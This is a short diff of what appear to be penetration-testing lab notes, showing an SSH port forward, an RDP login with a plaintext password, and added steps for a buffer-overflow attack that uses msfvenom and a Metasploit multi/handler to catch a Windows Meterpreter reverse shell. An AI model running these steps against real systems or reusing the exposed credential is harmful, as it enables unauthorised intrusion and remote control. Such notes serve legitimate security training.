@@ -157,4 +157,12 @@ ssh -S /tmp /aaron aaron -O forward -L 1441:192.168.28.29:9999
 anotherpassword4THEages
 xfreerdp /v:192.168.28.179:1440 /u:Lroth /p:anotherpassword4THEages /size:1920x1000 +clipboard
 vim secureserverBuffo.py change port to 1440
+generate payload with msfvenom
+msfcouse
+use exploit/multi/handler
+set payload windows/meterpreter/reverse_tcp
+show options
+set LHOST 0.0.0.0
+exploit
+./secureserverBuffo.py
 
